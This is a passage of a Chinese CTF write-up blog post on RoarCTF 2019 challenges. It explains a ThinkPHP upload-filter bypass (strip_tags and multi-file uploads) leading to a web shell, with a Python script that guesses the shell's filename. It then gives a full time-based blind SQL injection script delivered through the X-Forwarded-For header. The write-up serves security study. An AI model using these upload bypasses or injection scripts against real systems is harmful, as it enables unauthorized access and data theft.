$_FILES[&#39;file&#39;][&#39;name&#39;]        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {            return false;        }        $upload = new \Think\Upload();// 实例化上传类        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小        $upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型        $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录        $upload-&gt;savePath = &#39;&#39;;// 设置附件上传子目录        $info = $upload-&gt;upload() ;        if(!$info) {// 上传错误提示错误信息          $this-&gt;error($upload-&gt;getError());          return;        }else{// 上传成功 获取上传文件信息          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));        }    }}</code></pre><h4 id="解法一-thinkphp漏洞"><a href="#解法一-thinkphp漏洞" class="headerlink" title="解法一 thinkphp漏洞"></a>解法一 thinkphp漏洞</h4><p>利用<code>Think\Controller,\Think\Upload()</code> 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码</p><p>阅读文件上传部分代码发现</p><pre><code class="php">&lt;?php    ....    public function upload($files = &#39;&#39;)    {        if (&#39;&#39; === $files) {            $files = $_FILES;        }        .....        $files = $this-&gt;dealFiles($files);        foreach ($files as $key =&gt; $file) {            $file[&#39;name&#39;] = strip_tags($file[&#39;name&#39;]);            if (!isset($file[&#39;key&#39;])) {                $file[&#39;key&#39;] = $key;            }        ....    }    ....    ?&gt;</code></pre><p>这里注意到有个strip_tags,查询文档<code>从字符串中去除 HTML 和 PHP 标记</code></p><p>ok,成功找到绕过后缀名限制的方法</p><p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p><p>成功getflag美滋滋</p><h4 id="解法二-上传多个文件绕过后缀名检测"><a href="#解法二-上传多个文件绕过后缀名检测" class="headerlink" title="解法二  上传多个文件绕过后缀名检测"></a>解法二  上传多个文件绕过后缀名检测</h4><p>大佬们太强了/fad/fad</p><pre><code class="php"> $uploadFile = $_FILES[&#39;file&#39;] ;if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {            return false;        }</code></pre><p>如果上传多个文件, $uploadFile内包含多个文件,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了</p><pre><code class="pyhon">import requestsurl=&quot;http://aba32602-5c6b-4a9f-bfa6-bbf2ca660f7e.node3.buuoj.cn/Public/Uploads/2019-10-18/&quot;i=(int(&quot;5da9dd208595a&quot;,16)+1)while True:    print(url+hex(i)[2:]+&quot;.php&quot;)    res=requests.get(url+hex(i)[2:]+&quot;.php&quot;)    print(res.status_code)    if(res.status_code==200):        print(url+hex(i)[2:]+&quot;.php&quot;)        break    i+=1</code></pre><p>虽然说可以爆出来，不过也要跑好一会</p><h3 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h3><p>利用libcurl和paras_url的差异来判断</p><p><a href="http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@39.108.164.219@ccccccccccccc.com</a></p><p>200</p><p><a href="http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://user@ccccccccccccc.com@39.108.164.219</a></p><p>504</p><p>而访问<a href="http://node3.buuoj.cn:28001/?url=http://39.108.164.219" target="_blank" rel="noopener">http://node3.buuoj.cn:28001/?url=http://39.108.164.219</a></p><p>也是504,所以有可能使用file_get_contents来访问url</p><p>刚开始一直盯着url,后面看到收集信息,99%是sql注入的题</p><p>就是不知道要收集什么信息</p><pre><code class="html">&lt;!-- Debug Info:  Duration: 0.20821499824524 s  Current Ip: 127.0.0.1  --&gt;&lt;!-- Debug Info:  Duration: 0.34751987457275 s  Current Ip: &#39;# Last Ip: &#39; --&gt;</code></pre><p>这题虽然是sql注入,但比较操蛋的是,sql注入的是last ip</p><p>因为这个加上自己的懒惰让我搞了8-9个小时,因小失大/fad</p><p>题目提示会收集信息,能收集的大概也就是ip地址</p><p>于是找到x-forward-for http注入,虽然说的轻松,但是我完全找了好久还加上了wp的帮助</p><p>emmmm直接扔脚本</p><pre><code class="python">import requestsimport stringimport randomimport timeimport sysdef rand_str(length=8):    return &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, length))ii=0def curl_url(sql):    global ii    headers={        &quot;Host&quot;:&quot;node3.buuoj.cn:28645&quot;,        &quot;Cache-Control&quot;:&quot;max-age=0&quot;,        &quot;X-Forwarded-For&quot;:&quot;&quot;,        &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,        &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;,        &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;,        &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;,        &quot;Connection&quot;:&quot;close&quot;    }    cookies={&quot;track_uuid&quot;:&quot;1e3b12a4-60f8-4778-a0b7-%s;&quot; % rand_str()}    #1&#39;+if(ascii(substr(hex((select GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database())),1,1))&gt;0,sleep(10),0)+&#39;13    # headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)    url=&quot;http://node3.buuoj.cn:28841?url=http://127.0.0.1&quot;    #清空    while True:        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)        try:            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)        except :            pass        if &quot;Last Ip: clear&quot; in res.text:            break        ii+=1    #压入    headers[&quot;X-Forwarded-For&quot;]=&quot;1&#39;+if(&quot;+sql+&quot;,sleep(10),0)+&#39;&quot;+str(ii)    res= requests.get(url,headers=headers,cookies=cookies,timeout=3)    #执行    while True:        ii+=1        headers[&quot;X-Forwarded-For&quot;]=&quot;clear&quot;+str(ii)        try:            res= requests.get(url,headers=headers,cookies=cookies,timeout=3)        except :            return 1        if sql not in res.text:            curl_url(sql)        return 0#database information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf#table  F4l9_t4b1e#column F4l9_C01uMn#flag flag{G1zj1n_W4nt5_4_91r_Fr1end},flag{03a6ead5-ffec-4bc0-bffd-92efd5a81e11}sql=&quot;(substr(hex((select GROUP_CONCAT(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e )),INDEX,1))=&#39;GUESS&#39;&quot;result=&quot;696e666f726d6174696f6e5f736368656d612c746573742c6d7973716c2c637466747261696e696e672c706572666F726D616E63655F736368656D612c46346c395&quot;result=&quot;666c61677b47317a6a316e5f57346e74355f345f393172115&quot;index=len(result)while True:    index+=1    for i in range(16):        ii+=1        tmp=sql.replace(&quot;INDEX&quot;,str(index)).replace(&quot;GUESS&quot;,hex(i)[2:])        if curl_url(tmp):            result+=hex(i)[2:]            print(result)            break        print(&quot;第&quot;+str(index)+&quot;不是&quot;+hex(i)[2:])</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://www.ccreater.top/2019/10/15/roarctf2019/">https://www.ccreater.top/2019/10/15/roarctf2019/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
